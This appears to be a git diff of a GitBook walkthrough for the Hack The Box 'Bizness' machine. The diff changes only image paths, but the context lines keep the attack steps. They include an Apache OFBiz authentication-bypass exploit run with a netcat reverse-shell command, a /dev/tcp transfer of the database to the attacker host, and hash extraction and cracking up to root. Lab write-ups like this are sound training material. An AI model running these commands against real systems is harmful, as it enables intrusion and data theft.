@@ -1,6 +1,6 @@
 # Bizness
 
-<div align="left"><figure><img src="../.gitbook/assets/image (3) (1).png" alt="" width="150"><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt="" width="150"><figcaption></figcaption></figure></div>
 
 🔗 [Bizness](https://www.hackthebox.com/machines/bizness)
 
@@ -141,7 +141,7 @@ https://bizness.htb/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][
 
 Then, go to web server via browser:
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Doing a directory enumeration with Dirb tool and checking source page we don't discover others useful thing.
 
@@ -149,13 +149,13 @@ Doing a directory enumeration with Dirb tool and checking source page we don't d
 dirb https://bizness.htb 
 ```
 
-<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We discover an interesting page that contains login form and the version of ERP:
 
 [https://bizness.htb/accounting/control/main](https://bizness.htb/accounting/control/main)
 
-<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 apache ofbiz
@@ -176,15 +176,15 @@ OFBiz vs is already present into last screen:
 
 Using searchsploit tool we can discover quickly an exploit for this version of Apache OFBiz
 
-<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 search it on google to check potential alternatives and find the relative CVE ID
 
-<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 this CVE is about 2024, so we need to check another CVE for 2023, so google: "ofbiz 18.12 CVE 2023"&#x20;
 
-<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 and we found a CVE about 2023 on nist site:&#x20;
 
@@ -210,7 +210,7 @@ Download files locally using git clone command:
 git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
 ```
 
-<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 check our attacker box machine IP using `ifconfig tun0` go in listening mode using netcat `nc -lvnp 1339` and into another shell, go run our exploit spawning a /bin/bash shell
 
@@ -220,7 +220,7 @@ python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.17.177
 
 
 
-<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 ```
@@ -232,7 +232,7 @@ ofbiz
 
 Go to the user home dir using cd \~ and cat the user flag
 
-<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -248,7 +248,7 @@ f17ce10e2a6f6da2a5f4d76ebb61c401
 
 We can find it into /opt directory
 
-<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 /opt/ofbiz
@@ -260,11 +260,11 @@ To make our shell interactive and more usable run this command: `python3 -c 'imp
 
 and start to search into a configuration files the hashing algorithm used.
 
-<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 there's an interesting file at the path: /opt/ofbiz/framework/security/config that contains the answer:
 
-<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 SHA
@@ -276,7 +276,7 @@ Search directory that regards database among the folders regarding data.
 
 We found an interesting file at the path: `/opt/ofbiz/runtime/data/derby/derby.log` that contains db logs with correspective db name and its version
 
-<figure><img src="../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 Apache Derby
@@ -286,13 +286,13 @@ Apache Derby
 
 Navigating into folders there's an interesting  file at path: /opt/ofbiz/runtime/data/derby/ofbiz/seg0 with more files .dat
 
-<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Search into them if there's an 'admin' string using this command: `grep -a -l 'admin.$' *.dat` to search only interesting files that should contains sensitive administrative strings
 
-<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 and into file called: c6650.dat we found this value: `admin$"$SHA$$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`
 
@@ -304,7 +304,7 @@ and into file called: c6650.dat we found this value: `admin$"$SHA$$SHA$d$uP0_QaV
 
 Maybe, I've already gone too far with the previous question.
 
-<figure><img src="../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (21) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ij utility seems be not present into these machine, so we can transfer .dat files and install ij utility on our kali attacker machine.
 
@@ -313,7 +313,7 @@ ij utility seems be not present into these machine, so we can transfer .dat file
   * Go in listening mode on attacker machine: `nc -lvnp 4433 > derby.tar`
   * Send file via netcat: `cat /dev/shm/derby.tar > /dev/tcp/10.10.17.177/4433`
 
-<figure><img src="../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now we've a db on attacker machine, unzip the db archieve using: `tar -xvf derby.tar`
 
@@ -327,7 +327,7 @@ connect 'jdbc:derby:./ofbiz;create=true';
 show tables;
 ```
 
-<figure><img src="../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (25) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 In my case i've add an additional flag 'true' to to start the connection correctly.
 
@@ -397,7 +397,7 @@ obtaining our psw in cleartext: `b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monk
 
 
 
-<figure><img src="../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (26) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 monkeybizness
@@ -407,7 +407,7 @@ monkeybizness
 
 Finally, we know the admin password and we can access using sudo command: `su -`
 
-<figure><img src="../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (27) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -417,4 +417,4 @@ Finally, we know the admin password and we can access using sudo command: `su -`
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (28) (1) (1).png" alt=""><figcaption></figcaption></figure>
